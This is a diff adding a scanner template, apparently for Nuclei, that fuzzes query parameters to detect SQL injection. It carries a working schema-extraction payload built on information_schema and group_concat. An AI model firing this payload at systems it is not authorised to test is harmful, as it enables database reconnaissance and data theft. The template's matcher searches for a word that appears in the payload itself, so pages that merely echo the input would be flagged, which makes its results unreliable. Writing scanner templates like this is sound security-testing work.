@@ -1,0 +1,39 @@
+id: fuzz-sqli-detection
+
+info:
+  name: SQL Injection Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect SQL injection vulnerabilities by using a payload that attempts to extract database schema information.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET" || method == "POST"'  # Adjust based on where the SQL injection is suspected
+
+    payloads:
+      sqli:
+        - "(select%20group_concat(table_name,0x3a,column_name,0x5c6e)%20from%20information_schema.columns%20where%20table_schema=database())"
+      
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "information_schema"
+
+      - type: status
+        status:
+          - 200
+        condition: and
